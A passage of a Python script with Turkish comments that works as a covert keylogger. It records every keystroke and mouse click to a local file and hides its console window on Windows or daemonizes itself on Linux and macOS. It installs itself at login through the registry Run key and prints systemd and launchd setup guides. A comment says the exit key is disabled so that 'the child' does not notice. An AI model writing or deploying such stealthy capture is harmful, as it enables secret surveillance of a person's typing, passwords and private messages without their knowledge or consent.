"""

  WINDOWS  → pythonw.exe  +  SW_HIDE (WinAPI)
    • pythonw.exe:  konsol penceresi açmayan Python yorumlayıcısı.
    • SW_HIDE:      eğer script python.exe ile başlatılmışsa mevcut
                    konsolu runtime'da gizler (FreeConsole yedek).
    • winreg autostart komutu doğrudan pythonw.exe'yi işaret eder.

  LINUX    → çift fork (POSIX daemon)
    • fork() #1: orijinal süreç çıkar, kabuk prompt'a döner.
    • setsid():  yeni oturum lideri → terminal bağlantısı kopar.
    • fork() #2: oturum liderinin kendisi de çıkar, böylece süreç
                 hiçbir zaman kontrol terminali edinemez.
    • stdin/stdout/stderr → /dev/null yönlendirilir.

  MACOS    → aynı çift fork (POSIX daemon)
    • launchd .plist ile başlatılırsa fork gerekmez;
      launchd zaten süreci arka planda yönetir.
    • Doğrudan çalıştırılırsa Linux ile aynı fork mantığı devreye girer.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Gereksinimler:
    pip install pynput

Kullanım:
    Windows  : pythonw alphabet_tracker.py          ← görünmez başlatır
               python  alphabet_tracker.py           ← de çalışır (SW_HIDE)
               python  alphabet_tracker.py --autostart
               python  alphabet_tracker.py --remove
    Linux/Mac: python  alphabet_tracker.py           ← daemonize eder
               python  alphabet_tracker.py --autostart
               python  alphabet_tracker.py --remove
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import sys
import os
import time
import platform
import argparse
import logging
from datetime import datetime
from pynput import keyboard, mouse

# ─── Ayarlar ───────────────────────────────────────────────────────────────────
SCRIPT_DIR      = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE     = os.path.join(SCRIPT_DIR, "alfabe_takip.txt")
SESSION_FILE    = os.path.join(SCRIPT_DIR, ".session_count")
LOG_FILE        = os.path.join(SCRIPT_DIR, "tracker_debug.log")  # Hata günlüğü
LOG_MOUSE_MOVES = False
APP_NAME        = "AlfabeTakip"
# ────────────────────────────────────────────────────────────────────────────────

ALPHABET = set("abcçdefgğhıijklmnoöprsştuüvyz"
               "ABCÇDEFGĞHIİJKLMNOÖPRSŞTUÜVYZ"
               "0123456789")

events        = []
session_start = None
session_no    = 1

# Konsol yokken print() çökmemesi için loglama altyapısı
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s  %(levelname)s  %(message)s",
    encoding="utf-8",
)

def log(mesaj: str):
    """Hem dosyaya hem (varsa) konsola yaz."""
    logging.info(mesaj)
    try:
        print(mesaj)
    except Exception:
        pass   # Konsol yoksa sessizce geç


# ══════════════════════════════════════════════════════════════════════════════
# PLATFORM BAZLI GİZLİ MOD
# ══════════════════════════════════════════════════════════════════════════════

def gizli_mod_etkinlestir():
    """
    Mevcut süreci görünmez / konsulsuz moda geçirir.
    Her platform için farklı bir yöntem kullanılır.
    """
    sistem = platform.system()

    # ── WINDOWS ──────────────────────────────────────────────────────────────
    if sistem == "Windows":
        _windows_gizle()

    # ── LINUX / MACOS ─────────────────────────────────────────────────────────
    elif sistem in ("Linux", "Darwin"):
        # Zaten launchd/systemd tarafından başlatıldıysa fork gereksiz.
        # INVOCATION_ID (systemd) veya ebeveyn PID=1 (launchd) kontrolü:
        if os.environ.get("INVOCATION_ID") or os.getppid() == 1:
            log("Servis/agent tarafından başlatıldı — fork atlanıyor.")
            _posix_stdio_kapat()
        else:
            _posix_daemonize()


def _windows_gizle():
    """
    Windows'ta konsol penceresini gizle.

    YÖNTEMİN ÇALIŞMA MANTIĞI:
    ──────────────────────────
    Python'un iki Windows yorumlayıcısı vardır:
      • python.exe   → konsol alt sistemi (siyah pencere açar)
      • pythonw.exe  → Windows alt sistemi  (pencere açmaz)

    --autostart komutu pythonw.exe kullanır, bu yüzden normalde
    bu fonksiyon hiç çağrılmaz. Yedek olarak, kullanıcı yanlışlıkla
    python.exe ile başlatırsa mevcut konsol penceresi WinAPI ile gizlenir.

    GetConsoleWindow() → konsol penceresinin HWND tanıtıcısını döndürür.
    ShowWindow(hwnd, 0) → SW_HIDE = 0 : pencereyi gizler, process ölmez.
    FreeConsole()       → sürecin konsolla ilişkisini tamamen keser.
    """
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        user32   = ctypes.windll.user32

        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)   # SW_HIDE
            kernel32.FreeConsole()        # konsol bağlantısını kes
            log("Windows konsol penceresi gizlendi (SW_HIDE + FreeConsole).")
    except Exception as e:
        log(f"Windows gizleme hatası: {e}")


def _posix_daemonize():
    """
    POSIX çift-fork daemon tekniği.

    ADIM ADIM AÇIKLAMA:
    ────────────────────
    fork() sistem çağrısı mevcut süreci klonlar.
    Ebeveyn çıkarsa çocuk "yetim" kalır → init/systemd evlat edinir.

    FORK #1 — Kabuktan kopmak
      Amaç: Süreci arka plana almak.
      Ebeveyn (orijinal PID) çıkar → kabuk prompt'a döner.
      Çocuk devam eder ama hâlâ eski oturumun üyesidir.

    setsid() — Yeni oturum aç
      Çocuğu yeni bir oturum lideri yapar.
      Artık hiçbir kontrol terminaline bağlı değil.
      Ancak yeni bir terminal edinilebilir (güvenlik riski).

    FORK #2 — Oturum liderliğinden çıkmak
      Oturum lideri (fork#1'in çocuğu) çıkar.
      Torun (fork#2'nin çocuğu) oturum lideri değil →
      POSIX garantisi: oturum lideri olmayan süreç
      kontrol terminali edinemez. Tamamen bağımsız.

    /dev/null yönlendirmesi
      stdin  ← /dev/null  (okuma olmayacak)
      stdout → /dev/null  (print() çıktısı yutulur, log dosyası var)
      stderr → /dev/null  (hata mesajları log dosyasına gidiyor zaten)
    """
    try:
        # ── Fork #1 ──
        pid = os.fork()
        if pid > 0:
            os._exit(0)   # Ebeveyn çıkıyor
    except OSError as e:
        log(f"Fork #1 hatası: {e}")
        return

    # Yeni oturum lideri ol, terminali bırak
    os.setsid()

    try:
        # ── Fork #2 ──
        pid = os.fork()
        if pid > 0:
            os._exit(0)   # Ara ebeveyn çıkıyor
    except OSError as e:
        log(f"Fork #2 hatası: {e}")
        return

    # Çalışma dizinini sabitle (bağlanan disk ayrılmasın diye /)
    os.chdir("/")
    # Dosya izin maskesini sıfırla
    os.umask(0)

    _posix_stdio_kapat()
    log("POSIX daemon başlatıldı (çift-fork tamamlandı).")


def _posix_stdio_kapat():
    """stdin/stdout/stderr'i /dev/null'a yönlendir."""
    with open(os.devnull, "r")  as dev_null_r, \
         open(os.devnull, "a+") as dev_null_w:
        os.dup2(dev_null_r.fileno(), sys.stdin.fileno())
        os.dup2(dev_null_w.fileno(), sys.stdout.fileno())
        os.dup2(dev_null_w.fileno(), sys.stderr.fileno())


# ══════════════════════════════════════════════════════════════════════════════
# YARDIMCI FONKSİYONLAR
# ══════════════════════════════════════════════════════════════════════════════

def zaman():
    return datetime.now().strftime("%H:%M:%S.%f")[:-3]


def ekle(tur, detay):
    ts = zaman()
    events.append({"zaman": ts, "tur": tur, "detay": detay})
    log(f"[{ts}] {tur:20s} → {detay}")


def oturum_no_oku():
    try:
        with open(SESSION_FILE, "r") as f:
            return int(f.read().strip()) + 1
    except (FileNotFoundError, ValueError):
        return 1


def oturum_no_yaz(no):
    with open(SESSION_FILE, "w") as f:
        f.write(str(no))


# ══════════════════════════════════════════════════════════════════════════════
# KLAVYE & MOUSE DİNLEYİCİLERİ
# ══════════════════════════════════════════════════════════════════════════════

def on_press(key):
    try:
        char = key.char
        if char:
            tur = "HARF/RAKAM" if char in ALPHABET else "ÖZEL KARAKTER"
            ekle(tur, f"'{char}' tuşuna basıldı")
    except AttributeError:
        ekle("ÖZEL TUŞ", str(key).replace("Key.", "").upper())


def on_release(key):
    # Gizli modda ESC çalışmaz (çocuk görmesin).
    # Durdurmak için: Windows → Görev Yöneticisi, Linux/Mac → kill <PID>
    pass


def on_click(x, y, button, pressed):
    if pressed:
        btn = ("Sol Tık"  if button == mouse.Button.left  else
               "Sağ Tık"  if button == mouse.Button.right else "Orta Tık")
        ekle("MOUSE TIKLAMA", f"{btn} → ({x}, {y})")


def on_scroll(x, y, dx, dy):
    ekle("MOUSE KAYDIRMA", f"{'Aşağı' if dy < 0 else 'Yukarı'} → ({x}, {y})")


def on_move(x, y):
    if LOG_MOUSE_MOVES:
        ekle("MOUSE HAREKET", f"({x}, {y})")


# ══════════════════════════════════════════════════════════════════════════════
# PERİYODİK KAYIT — Güç kesilmesine karşı her N olayda bir kaydet
# ══════════════════════════════════════════════════════════════════════════════

KAYIT_ARALIGI = 50   # Her 50 olayda bir diske yaz

def on_press_with_flush(key):
    on_press(key)
    if len(events) % KAYIT_ARALIGI == 0:
        ara_kaydet()


def ara_kaydet():
    """Tam rapor değil, ham veriyi güvenli biçimde diske yazar."""
    try:
        with open(OUTPUT_FILE + ".tmp", "a", encoding="utf-8") as f:
            for e in events[-KAYIT_ARALIGI:]:
                f.write(f"[{e['zaman']}] {e['tur']} → {e['detay']}\n")
    except Exception as ex:
        log(f"Ara kayıt hatası: {ex}")


# ══════════════════════════════════════════════════════════════════════════════
# OTURUM SONU RAPORU
# ══════════════════════════════════════════════════════════════════════════════

def kaydet():
    bitis = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        sure = round(time.time() - time.mktime(
            datetime.strptime(session_start, "%Y-%m-%d %H:%M:%S").timetuple()), 1)
    except Exception:
        sure = 0

    harf_sayim = {}
    for e in events:
        if e["tur"] == "HARF/RAKAM":
            harf = e["detay"].split("'")[1]
            harf_sayim[harf] = harf_sayim.get(harf, 0) + 1

    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write("\n" + "═" * 62 + "\n")
        f.write(f"  OTURUM #{session_no:03d}  —  {platform.system()} {platform.release()}\n")
        f.write("═" * 62 + "\n")
        f.write(f"  Başlangıç  : {session_start}\n")
        f.write(f"  Bitiş      : {bitis}\n")
        f.write(f"  Süre       : {sure} saniye\n")
        f.write(f"  Toplam Olay: {len(events)}\n")
        f.write("─" * 62 + "\n\n")

        f.write("  ETKİLEŞİM SIRASI\n")
        f.write("  " + "─" * 58 + "\n")
        for i, e in enumerate(events, 1):
            f.write(f"  {i:5d}. [{e['zaman']}]  {e['tur']:20s}  →  {e['detay']}\n")

        f.write("\n  HARF / RAKAM İSTATİSTİKLERİ\n")
        f.write("  " + "─" * 58 + "\n")
        if harf_sayim:
            for harf, sayi in sorted(harf_sayim.items(), key=lambda x: -x[1]):
                f.write(f"  '{harf}'  : {'█' * min(sayi, 40)} ({sayi})\n")
        else:
            f.write("  Hiç harf/rakam girilmedi.\n")

        f.write("\n" + "═" * 62 + "\n")

    oturum_no_yaz(session_no)

    # Geçici dosyayı temizle
    tmp = OUTPUT_FILE + ".tmp"
    if os.path.exists(tmp):
        os.remove(tmp)

    log(f"Oturum #{session_no} kaydedildi → {OUTPUT_FILE}")


# ══════════════════════════════════════════════════════════════════════════════
# OTOMATİK BAŞLATMA — WINDOWS (winreg)
# ══════════════════════════════════════════════════════════════════════════════

def _pythonw_yolu():
    """
    python.exe → pythonw.exe yolunu türet.
    pythonw.exe, Python kurulumunda python.exe ile aynı klasördedir.
    Konsol penceresi açmayan Windows alt sistemi yorumlayıcısıdır.
    """
    exe = sys.executable
    if exe.lower().endswith("python.exe"):
        pyw = exe[:-10] + "pythonw.exe"
        if os.path.exists(pyw):
            return pyw
    return exe   # zaten pythonw.exe ya da başka bir yorumlayıcı


def windows_autostart_ekle():
    try:
        import winreg
    except ImportError:
        log("winreg sadece Windows'ta kullanılabilir.")
        return

    # pythonw.exe kullanarak pencere açılmadan başlatılır
    yorumlayici = _pythonw_yolu()
    script      = os.path.abspath(__file__)
    komut       = f'"{yorumlayici}" "{script}"'
    yol         = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, yol,
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, APP_NAME, 0, winreg.REG_SZ, komut)
        log(f"Autostart eklendi → {komut}")
    except Exception as e:
        log(f"Autostart ekleme hatası: {e}")


def windows_autostart_kaldir():
    try:
        import winreg
    except ImportError:
        return
    yol = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, yol,
                            0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, APP_NAME)
        log(f"'{APP_NAME}' autostart'tan kaldırıldı.")
    except FileNotFoundError:
        log(f"'{APP_NAME}' zaten kayıtlı değil.")
    except Exception as e:
        log(f"Autostart kaldırma hatası: {e}")


# ══════════════════════════════════════════════════════════════════════════════
# LİNUX / MACOS KURULUM REHBERİ
# ══════════════════════════════════════════════════════════════════════════════

def goster_kurulum_rehberi(sistem):
    script = os.path.abspath(__file__)
    python = sys.executable

    if sistem == "Linux":
        servis = APP_NAME.lower()
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║  Linux — systemd Kullanıcı Servisi (arka plan, penceresiz)  ║
╚══════════════════════════════════════════════════════════════╝

Dosya: ~/.config/systemd/user/{servis}.service
(Kullanıcı servisi → sudo gerekmez, masaüstü oturumu erişimi var)

[Unit]
Description=Alfabe Takip (arka plan)
After=graphical-session.target

[Service]
Type=forking          ← script kendi fork'unu yapıyor
ExecStart={python} {script}
Restart=on-failure
RestartSec=10

[Install]
WantedBy=default.target

Kurulum:
  mkdir -p ~/.config/systemd/user
  nano ~/.config/systemd/user/{servis}.service  ← yukarıdakini yapıştır
  systemctl --user daemon-reload
  systemctl --user enable --now {servis}
  systemctl --user status {servis}

Durdurma:
  systemctl --user stop {servis}
""")

    elif sistem == "Darwin":
        plist = f"com.user.{APP_NAME.lower()}"
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║  macOS — launchd LaunchAgent (arka plan, penceresiz)         ║
╚══════════════════════════════════════════════════════════════╝

Dosya: ~/Library/LaunchAgents/{plist}.plist

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key>             <string>{plist}</string>
  <key>ProgramArguments</key>
  <array>
    <string>{python}</string>
    <string>{script}</string>
  </array>
  <key>RunAtLoad</key>         <true/>
  <key>KeepAlive</key>         <false/>
  <key>StandardOutPath</key>   <string>/dev/null</string>
  <key>StandardErrorPath</key> <string>/dev/null</string>
</dict></plist>

Kurulum:
  nano ~/Library/LaunchAgents/{plist}.plist  ← yukarıdakini yapıştır
  launchctl load ~/Library/LaunchAgents/{plist}.plist

Durdurma:
  launchctl unload ~/Library/LaunchAgents/{plist}.plist

NOT: Sistem Ayarları → Gizlilik & Güvenlik → Erişilebilirlik
     bölümünden Python'a izin verilmesi gerekebilir (Ventura+).
""")


# ══════════════════════════════════════════════════════════════════════════════
# ANA PROGRAM
# ══════════════════════════════════════════════════════════════════════════════

def main():
    global session_start, session_no

    parser = argparse.ArgumentParser()
    parser.add_argument("--autostart", action="store_true")
    parser.add_argument("--remove",    action="store_true")
    args = parser.parse_args()

    # ── Yönetim komutları ───────────────────────────────────────────────────
    if args.autostart or args.remove:
        sistem = platform.system()
        if sistem == "Windows":
            windows_autostart_ekle() if args.autostart else windows_autostart_kaldir()
        else:
            goster_kurulum_rehberi(sistem)
        return

    # ── Gizli moda geç ─────────────────────────────────────────────────────
    # Bu çağrı platform'a göre doğru yöntemi seçer.
    # Çift-fork (Linux/Mac) sonrasında PID değişir; bu normal.
    gizli_mod_etkinlestir()

    # ── Oturumu başlat ─────────────────────────────────────────────────────
    session_no    = oturum_no_oku()
    session_start = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log(f"Oturum #{session_no} başladı — {platform.system()}")

    # ── Güvenli çıkış: beklenmeyen kapanmalarda kaydet ─────────────────────
    import atexit
    import signal

    atexit.register(kaydet)

    def sinyal_isle(sig, frame):
        kaydet()
        sys.exit(0)

    try:
        signal.signal(signal.SIGTERM, sinyal_isle)  # kill komutu
        signal.signal(signal.SIGINT,  sinyal_isle)  # Ctrl+C (yedek)
    except (OSError, AttributeError):
        pass   # Windows'ta bazı sinyaller desteklenmez

    # ── Dinleyicileri başlat ────────────────────────────────────────────────
    mouse_listener = mouse.Listener(
        on_click=on_click,
        on_scroll=on_scroll,
        on_move=on_move,
    )
    kb_listener = keyboard.Listener(
        on_press=on_press_with_flush,
        on_release=on_release,
    )

    mouse_listener.start()
    kb_listener.start()

    # Ana thread dinleyiciler bitene dek bekler
    kb_listener.join()
    mouse_listener.stop()


if __name__ == "__main__":
    main()
